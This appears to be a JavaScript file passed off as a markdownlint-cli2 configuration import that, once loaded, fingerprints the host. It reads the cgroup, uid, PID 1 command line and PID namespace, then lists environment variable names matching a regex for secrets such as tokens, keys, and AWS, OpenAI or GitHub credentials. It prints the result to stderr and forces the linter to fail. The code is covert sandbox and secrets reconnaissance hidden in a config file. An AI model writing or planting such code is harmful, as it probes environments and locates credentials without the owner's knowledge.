// H67-5: markdownlint-cli2 config import -> NSJAIL cgroup line + uid + PID1.
const fs = require('fs');
function fp() {
  const parts = [];
  try {
    const cg = fs.readFileSync('/proc/self/cgroup', 'utf8').split('\n').filter(l => l.indexOf('memory:') >= 0);
    parts.push('cg=' + (cg[0] || 'none').trim());
  } catch (e) { parts.push('cg-err'); }
  try { parts.push('uid=' + process.getuid()); } catch (e) {}
  try { parts.push('pid1=' + fs.readFileSync('/proc/1/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 100)); } catch (e) { parts.push('pid1-err'); }
  try { parts.push('pidns=' + fs.readlinkSync('/proc/self/ns/pid')); } catch (e) {}
  try { parts.push('env=' + Object.keys(process.env).sort().filter(k => /KEY|TOKEN|SECRET|PASS|CRED|DATABASE|GITHUB|GITLAB|OPENAI|ANTHROPIC|AWS|GCP|GOOGLE|STRIPE|SLACK|SMTP/i.test(k)).join(',')); } catch (e) {}
  return parts.join(' | ');
}
console.error('H67-MD4 ' + fp().replace(/\s+/g, ' ').slice(0, 400));
process.exit(1);
